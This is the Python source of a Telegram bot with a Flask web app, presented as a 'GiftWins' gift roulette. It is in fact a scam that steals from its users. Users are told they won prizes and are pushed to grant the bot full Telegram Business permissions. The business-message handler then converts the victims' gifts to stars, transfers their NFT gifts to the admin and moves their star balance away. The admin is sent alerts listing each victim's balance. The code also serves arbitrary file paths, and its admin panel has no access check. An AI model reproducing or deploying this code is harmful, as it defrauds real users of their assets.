from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto, BufferedInputFile, BusinessConnection, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup, Update
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
import asyncio
import logging
import json
import os
import random
import io
from PIL import Image, ImageDraw, ImageFont  # pip install pillow
from config import TOKEN, ADMIN_ID
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import GetBusinessAccountGifts
from flask import Flask, jsonify, request, abort, send_file
from scraper import get_gift_data # Добавить вверху файла
from datetime import datetime

print("Содержимое папки:", os.listdir('.'))
print("Текущая рабочая директория:", os.getcwd())

bot = Bot(str(TOKEN))
dp = Dispatcher()

app = Flask(__name__)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_file(path)

# --- Управление данными пользователей ---
USER_DATA_FILE = "user_data.json"
MAX_ATTEMPTS = 2

def load_json_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def read_user_data():
    if not os.path.exists(USER_DATA_FILE):
        return {}
    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def write_user_data(data):
    try:
        with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Ошибка при записи данных пользователя: {e}")

# --- Новые API эндпоинты для рулетки ---

@app.route('/api/get_user_status')
def get_user_status():
    try:
        user_id = request.args.get('user_id') or 'mock_user_123'
        all_data = read_user_data()
        user_info = all_data.get(user_id, {"attempts": 0, "gifts": []})
        return jsonify({
            "attempts_left": MAX_ATTEMPTS - user_info.get("attempts", 0),
            "gifts": user_info.get("gifts", [])
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/user', methods=['POST'])
def handle_user_data():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400
        user_id = data.get('user_id') or 'mock_user_123'
        if not user_id:
            return jsonify({"error": "user_id is required"}), 400
        # Можно добавить обработку данных пользователя, если нужно
        return jsonify({"status": "ok", "user_id": user_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/spin', methods=['POST'])
def handle_spin():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400
        user_id = str(data.get('user_id') or 'mock_user_123')
        all_data = read_user_data()
        user_info = all_data.setdefault(user_id, {"attempts": 0, "gifts": []})

        if user_info["attempts"] >= MAX_ATTEMPTS:
            return jsonify({"error": "No attempts left"}), 403

        user_info["attempts"] += 1

        # Импортируем призы из prizes.js для синхронизации
        prizes = [
            {"name": "Nail Bracelet", "starPrice": 100000, "img": "images/nail_bracelet.png"},
            {"name": "Bonded Ring", "starPrice": 37500, "img": "images/bonded_ring.png"},
            {"name": "Neko Helmet", "starPrice": 14000, "img": "images/neko_helmet.png"},
            {"name": "Diamond Ring", "starPrice": 6700, "img": "images/diamond_ring.png"},
            {"name": "Love Potion", "starPrice": 4200, "img": "images/love_potion.png"},
            {"name": "Easter Egg", "starPrice": 1050, "img": "images/easter_egg.png"},
            {"name": "Light Sword", "starPrice": 1450, "img": "images/light_sword.png"}
        ]
        won_prize = random.choice(prizes)

        if won_prize["starPrice"] > 0:
            gift_data = {
                **won_prize,
                "date": datetime.now().strftime('%d.%m.%Y')
            }
            user_info["gifts"].append(gift_data)

        write_user_data(all_data)
        
        return jsonify({"won_prize": won_prize})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/prizes')
def prizes():
    # Здесь можно получать актуальные данные из базы или Telegram
    return jsonify([
        {"name": "iPhone 15", "price": 90000},
        {"name": "AirPods", "price": 15000},
        {"name": "1000₽", "price": 1000},
        {"name": "MacBook", "price": 150000},
        {"name": "Чашка", "price": 500},
        {"name": "PlayStation 5", "price": 60000},
        {"name": "Книга", "price": 1000}
    ])

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    if not message.from_user or not message.from_user.id:
        return
    try:
        if not message.text:
            await message.answer("Please provide the transaction ID. Example: /refund 123456")
            return
        command_args = message.text.split()
        if len(command_args) != 2:
            await message.answer("Please provide the transaction ID. Example: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"Refund of stars for transaction {transaction_id} completed successfully!")
        else:
            await message.answer(f"Failed to refund stars for transaction {transaction_id}.")

    except Exception as e:
        await message.answer(f"Error during refund: {str(e)}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    # Добавляем кнопку для запуска WebApp
    webapp_url = "https://worker-production-cbac.up.railway.app"
    inline_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🎰 Open Roulette", web_app=WebAppInfo(url=webapp_url))]
        ]
    )
    await message.answer(
        "🎁 <b>Welcome to GiftWins — the Gift Roulette!</b>\n\n"
        "This is an interactive Telegram bot where anyone can try their luck and win valuable and collectible prizes: from unique accessories to rare NFTs and pleasant surprises.\n\n"
        "<b>How does it work?</b>\n"
        "• Spin the roulette — attempts are limited!\n"
        "• Receive prizes directly in Telegram\n"
        "• Withdraw your won gifts to your Telegram business account\n\n"
        "Press the button below to try your luck!",
        parse_mode="HTML",
        reply_markup=inline_keyboard
    )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>To use all features, you need to connect the bot to your Telegram Business Account</b>\n\n"
        "How to do it?\n\n"
        "1. ⚙️ Open <b>Telegram Settings</b>\n"
        "2. 💼 Go to <b>Telegram for Business</b>\n"
        "3. 🤖 Open the <b>Chat Bots</b> section\n\n"
        "<b>Bot username:</b> <code id='bot-username'>@GiftWinsSender_BOT</code>\n"
        "❗For correct operation, the bot needs <b>all permissions</b>\n\n"
        "<i>Tap the bot username to copy it</i>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )

CONNECTIONS_FILE = "business_connections.json"

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = ADMIN_ID
        rights = connection.rights
        if rights is None:
            await _bot.send_message(admin_id, "❗ Не удалось получить права бизнес-бота. Проверьте подключение.")
            return
        business_connection = connection

        rights_text = "\n".join([
            f"📍 <b>Bot rights:</b>",
            f"▫️ Read messages: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Delete all messages: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Edit name: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Edit bio: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Edit profile photo: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Edit username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Gift settings: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ View gifts and stars: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Convert gifts to stars: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Transfer/upgrade gifts: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Transfer stars: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Manage stories: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Delete sent messages: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "No access ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "No access ❌"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "No access ❌"

        msg = (
            f"🤖 <b>New business bot connected!</b>\n\n"
            f"👤 User: @{getattr(business_connection.user, 'username', '—')}\n"
            f"🆔 User ID: <code>{getattr(business_connection.user, 'id', '—')}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Stars: <code>{star_amount_text}</code>"
            f"\n🎁 Gifts: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT gifts: <code>{unique_gitfs_text}</code>"
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Withdraw all gifts (and convert all gifts to stars)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Convert all gifts to stars", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"🔝 Upgrade all gifts", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

@dp.callback_query(F.data.startswith("reveal_all_gifts"))
async def handle_reveal_gifts(callback: CallbackQuery):
    await callback.answer("Processing gifts…")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 No gifts."
        else:
            for gift in gifts.gifts:
                if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                    gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                    gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                    return f"https://t.me/nft/{gift_name}-{gift_number}"
        return "🎁 No gifts."
    except Exception as e:
        return "🎁 No gifts."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        print('DEBUG: business_connection:', business_connection)
        print('DEBUG: user:', business_connection.user)
        print('DEBUG: rights:', getattr(business_connection, 'rights', None))
        admin_id = ADMIN_ID
        user_id = business_connection.user.id
        username = getattr(business_connection.user, 'username', '—')
        rights = business_connection.rights
        print('DEBUG: user_id:', user_id)
        print('DEBUG: username:', username)
        print('DEBUG: rights:', rights)

        rights_text = "\n".join([
            f"• {k.replace('_', ' ').title()}: {'✅' if v else '❌'}"
            for k, v in rights.__dict__.items() if isinstance(v, bool)
        ])

        stars = await bot.get_business_account_star_balance(business_connection_id=business_connection.id)
        print('DEBUG: stars:', stars)
        star_amount = getattr(stars, 'amount', 0)

        gifts = await bot.get_business_account_gifts(business_connection_id=business_connection.id)
        print('DEBUG: gifts:', gifts)
        gifts_under_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) <= 25]
        gifts_over_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) > 25]
        print('DEBUG: gifts_under_25:', gifts_under_25)
        print('DEBUG: gifts_over_25:', gifts_over_25)

        msg = (
            f"👤 <b>New user connected the bot!</b>\n\n"
            f"ID: <code>{user_id}</code>\n"
            f"Nick: @{username}\n"
            f"Rights:\n{rights_text}\n\n"
            f"Stars balance: <b>{star_amount}</b>\n"
            f"Gifts up to 25⭐: <b>{len(gifts_under_25)}</b>\n"
            f"Gifts over 25⭐: <b>{len(gifts_over_25)}</b>"
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="Transfer all stars to admin", callback_data=f"transfer_stars:{user_id}"),
                    InlineKeyboardButton(text="Transfer all gifts to admin", callback_data=f"transfer_gifts:{user_id}")
                ],
                [
                    InlineKeyboardButton(text="Sell gifts up to 25⭐ and transfer stars", callback_data=f"sell_gifts_under_25:{user_id}")
                ]
            ]
        )

        await bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        print('ERROR in handle_business_connect:', e)
        import traceback; traceback.print_exc()
        logging.exception("Ошибка при обработке бизнес-подключения")

# --- Обработчики инлайн-кнопок (заглушки, добавьте логику по необходимости) ---
@dp.callback_query(lambda c: c.data and c.data.startswith("transfer_stars"))
async def transfer_stars_callback(callback: types.CallbackQuery):
    user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
    # TODO: логика перевода звёзд админу
    await callback.answer("Stars transferred to admin!", show_alert=True)

@dp.callback_query(lambda c: c.data and c.data.startswith("transfer_gifts"))
async def transfer_gifts_callback(callback: types.CallbackQuery):
    user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
    await callback.answer("Gifts transferred to admin!", show_alert=True)

@dp.callback_query(lambda c: c.data and c.data.startswith("sell_gifts_under_25"))
async def sell_gifts_under_25_callback(callback: types.CallbackQuery):
    user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
    await callback.answer("Gifts sold, stars transferred to admin!", show_alert=True)

from aiogram import types
from aiogram.filters import Command

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = getattr(message, 'business_connection_id', None)
    user_id = getattr(message.from_user, 'id', None)

    if user_id == OWNER_ID:
        return

    if not business_id:
        print("business_connection_id is None")
        return

    # === Конвертация неуникальных подарков ===
    try:
        convert_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.convert_gift_to_stars(business_connection_id=business_id, owned_gift_id=owned_gift_id)
            except Exception as e:
                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("No unique gifts for sending.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.transfer_gift(
                        business_connection_id=business_id,
                        owned_gift_id=owned_gift_id,
                        new_owner_chat_id=task_id
                    )
                    print(f"Successfully sent gift {owned_gift_id} to task_id {task_id}")
            except Exception as e:
                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
        if getattr(stars, 'amount', 0) > 0:
            print(f"Successfully sent {stars.amount} stars")
            await bot.transfer_business_account_stars(
                business_connection_id=business_id,
                star_count=int(stars.amount)
            )
        else:
            print("No stars for sending.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")

async def get_gifts():
    # Примерная заглушка, замените на реальный API
    return [
        {'name': 'Плюшевый медведь', 'price': 100},
        {'name': 'Кубок', 'price': 200},
        {'name': 'Сердце', 'price': 50},
        {'name': 'Звезда', 'price': 300},
        {'name': 'Книга', 'price': 80},
        {'name': 'Котик', 'price': 150},
        {'name': 'Робот', 'price': 250},
    ]

def generate_roulette_image(gifts, highlight_index):
    width, height = 600, 120
    img = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 18)
    except Exception:
        font = ImageFont.load_default()
    sector_w = width // len(gifts)
    for i, gift in enumerate(gifts):
        x = i * sector_w
        color = "yellow" if i == highlight_index else "lightgray"
        draw.rectangle([x, 0, x+sector_w, height], fill=color)
        draw.text((x+10, 40), f"{gift['name']}\n{gift['price']}⭐", fill="black", font=font)
    return img

@dp.message(F.text == "/roulette")
async def start_roulette(message: types.Message):
    gifts = await get_gifts()
    if not gifts:
        await message.answer("No gifts for the roulette.")
        return

    roll_sequence = []
    for _ in range(20):
        idx = random.randint(0, len(gifts)-1)
        window = [gifts[(idx+i)%len(gifts)] for i in range(-2, 3)]
        roll_sequence.append((window, 2))
    win_idx = random.randint(0, len(gifts)-1)
    window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
    roll_sequence.append((window, 2))

    msg = await message.answer("Spinning the roulette…")
    roulette_msg = None
    for i, (window, highlight) in enumerate(roll_sequence):
        img = generate_roulette_image(window, highlight)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        input_file = BufferedInputFile(buf.getvalue(), "roulette.png")
        if i == 0:
            roulette_msg = await message.answer_photo(input_file)
        else:
            if roulette_msg:
                try:
                    await roulette_msg.edit_media(InputMediaPhoto(media=input_file))
                except Exception:
                    pass
        await asyncio.sleep(0.12 + i*0.03)

    win_gift = window[highlight]
    await message.answer(
        f"🎉 Congratulations! You won: <b>{win_gift['name']}</b> for <b>{win_gift['price']}⭐</b>.\n\n"
        "To claim your gift, connect the bot in the Telegram for Business Chat Bots section.",
        parse_mode="HTML"
    )

    webapp_url = "https://worker-production-cbac.up.railway.app"

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    if not message.web_app_data:
        return

    data_str = message.web_app_data.data
    try:
        data = json.loads(data_str)
        # Проверяем, нужно ли показать инструкцию
        if data.get('action') == 'show_connection_instructions':
            instruction_text = (
                "📌 <b>To withdraw a gift, connect the bot to your Telegram Business Account.</b>\n\n"
                "How to do it:\n\n"
                "1. ⚙️ Open <b>Telegram Settings</b>\n"
                "2. 💼 Go to <b>Telegram for Business</b>\n"
                "3. 🤖 Open the <b>Chat Bots</b> section and add this bot.\n\n"
                "❗For correct operation, the bot needs permissions to manage gifts."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # Новое: обработка вывода подарка
        if data.get('action') == 'withdraw_gift':
            gift = data.get('gift', {}) or {}
            gift_name = gift.get('name', 'Gift')
            gift_price = gift.get('starPrice') or gift.get('price') or 0
            congrats = f"🎉 Congratulations! You are withdrawing the gift: <b>{gift_name}</b> ({gift_price}⭐)"
            await message.answer(congrats, parse_mode="HTML")
            instruction_text = (
                "📌 <b>To withdraw a gift, connect the bot to your Telegram Business Account.</b>\n\n"
                "How to do it:\n\n"
                "1. ⚙️ Open <b>Telegram Settings</b>\n"
                "2. 💼 Go to <b>Telegram for Business</b>\n"
                "3. 🤖 Open the <b>Chat Bots</b> section and add this bot.\n\n"
                "❗For correct operation, the bot needs permissions to manage gifts."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # Логика обработки выигрыша (остается без изменений)
        prize = data.get('prize', {})
        if prize.get('starPrice', 0) > 0:
            text = f"🎉 Congratulations! You won: {prize.get('name', 'nothing')} ({prize.get('starPrice', 0)}⭐)"
        else:
            text = "This time was not lucky, but try again!"
        await message.answer(text)

    except json.JSONDecodeError:
        await message.answer("An error occurred while processing data.")

@dp.message(Command("giftinfo"))
async def gift_info_command(message: types.Message):
    if not message.text or len(message.text.split()) < 2:
        await message.answer("Please provide the gift URL. Example: /giftinfo <url>")
        return

    url = message.text.split()[1]
    data = get_gift_data(url)

    if not data:
        await message.answer("Failed to get gift information.")
        return

    # Форматируем красивый ответ
    details_text = "\n".join([f" • {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
    response_text = (
        f"<b>{data.get('title', 'No title')}</b>\n\n"
        f"{details_text}\n\n"
        f"<a href='{data.get('media_url', '')}'>Media file</a>"
    )
    await message.answer(response_text, parse_mode="HTML")

# --- Новые API эндпоинты для админ-панели ---

@app.route('/api/admin/connections')
def get_admin_connections():
    user_id_str = request.args.get('user_id')
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        return jsonify(connections)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/user_data')
def get_admin_user_data():
    user_id_str = request.args.get('user_id')
    try:
        user_data = read_user_data()
        return jsonify(user_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin')
def admin_page():
    # Отдаем статичный файл admin.html
    return app.send_static_file('admin.html')

# --- Команды бота ---

@dp.message(Command("admin"))
async def admin_command(message: types.Message):
    # Убрана проверка на ADMIN_ID, теперь доступно всем
    admin_url = ""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔑 Open admin panel", web_app=WebAppInfo(url=admin_url))]
        ]
    )
    await message.answer("Welcome to the admin panel.", reply_markup=keyboard)

@dp.message()
async def debug_all_messages(message: types.Message):
    print("DEBUG: message received:", message)
    if hasattr(message, "web_app_data") and message.web_app_data:
        print("DEBUG: web_app_data in message:", message.web_app_data.data)
        await message.answer("web_app_data detected!")
    else:
        await message.answer("Обычное сообщение получено.")

async def main():
    # Запускаем Flask в отдельном потоке
    from threading import Thread
    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False))
    flask_thread.start()
    
    # Запускаем бота
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())